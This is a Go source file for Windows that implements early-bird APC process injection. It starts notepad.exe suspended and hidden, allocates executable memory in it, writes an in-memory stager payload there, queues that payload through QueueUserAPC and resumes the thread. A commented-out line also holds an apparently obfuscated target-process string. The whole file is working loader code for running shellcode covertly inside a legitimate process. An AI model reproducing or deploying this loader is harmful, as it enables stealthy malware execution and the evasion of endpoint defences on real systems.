//go:build windows

package utils

import (
	"fmt"
	"golang.org/x/sys/windows"
)

var (
	// Proc "c:\windows\explorer.exe"
	//Proc = "0000000000000000000000000000000031d842a0bd5c8bd0b69465ce6d4eec45a819ca2c7fee9d7dba0c6249e869e4cead83d0b9546ab64748b2bd48aae1b45c53c6db4e892cc64e3495dcf615a42642"
	Proc = "c:\\windows\\system32\\notepad.exe"
)

var (
	createFlags uint32 = windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
)

// SpawnInfo Struct to hold stagger in mem and procInfo.
type SpawnInfo struct {
	MemData *MemData
	MemAddr uintptr
	//procInfo    windows.ProcessInformation
	//startUpInfo StartupInfoEx
	startUpInfo STARTUPINFOW
	procInfo    PROCESS_INFORMATION
}

//func (spwnInfo *SpawnInfo) CreateProcA() {
//	sI := &STARTUPINFOW{}
//	pI := &PROCESS_INFORMATION{}
//	err := CreateProcessW(Proc, "", nil, nil, 0, 0x00000004, nil, "", sI, pI)
//	if err != nil {
//		fmt.Printf("Error CreateProcessW: %s\n", err)
//	}
//	fmt.Printf("Process created successfully! ProcessID %d, ThreadID %d\n", pI.ProcessId, pI.ThreadId)
//	//CreateProcessA(&Proc, "", nil, nil, true, 0, nil, nil, &sI, &pI)
//}

func (spwnInfo *SpawnInfo) CreateApp() {
	//appName, _ := windows.UTF16PtrFromString(ReturnValidate(Proc))
	//appName, _ := windows.UTF16PtrFromString(Proc) // We don't need to convert to utf-16
	//cmdLine, _ := windows.UTF16PtrFromString("") // Same here
	appName := Proc
	cmdLine := ""
	startupInfo := &spwnInfo.startUpInfo
	procInfo := &spwnInfo.procInfo

	err := CreateProcessW(appName, cmdLine, nil, nil, 0, 0x00000004, nil, "", startupInfo, procInfo)
	if err != nil {
		fmt.Println("Error Creating Process:", err)
		return
	}
	fmt.Printf("Process created successfully! ProcessID %d, ThreadID %d\n", procInfo.ProcessId, procInfo.ThreadId)
}

func (spwnInfo *SpawnInfo) AllocateMem() {
	memAddr, err := VirtualAllocEx(windows.Handle(spwnInfo.procInfo.Process), uintptr(0), uintptr(spwnInfo.MemData.Size), windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	//memAddr, err := VirtualAllocEx(spwnInfo.procInfo.Process, 0, spwnInfo.MemData.Size, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		fmt.Println("Failed to allocate Memory:", err)
		return
	}
	spwnInfo.MemAddr = memAddr
	//fmt.Printf("Sucessfully allocated memory in process %d: Memory Address %d\n", spwnInfo.procInfo.ProcessId, memAddr)
}

func (spwnInfo *SpawnInfo) WriteMem() {
	dataPtr := &spwnInfo.MemData.Data[0]
	err := WriteProcessMemory(windows.Handle(spwnInfo.procInfo.Process), spwnInfo.MemAddr, dataPtr, uintptr(spwnInfo.MemData.Size), nil)
	if err != nil {
		fmt.Println("Failed to write to memory:", err)
	}
	fmt.Println("Successfully Wrote to memory")
}

func (spwnInfo *SpawnInfo) CreateUserApc() {
	err := QueueUserAPC(spwnInfo.MemAddr, windows.Handle(spwnInfo.procInfo.Thread), uintptr(0))
	if err != nil {
		fmt.Println("Failed to call QueueUserAPC:", err)
	}
	fmt.Println("Successfully called QueueUserAPC")
}

func (spwnInfo *SpawnInfo) ResumeThread() {
	ResumeThread(windows.Handle(spwnInfo.procInfo.Thread))
	fmt.Println("Successfully called ResumedThread")
}
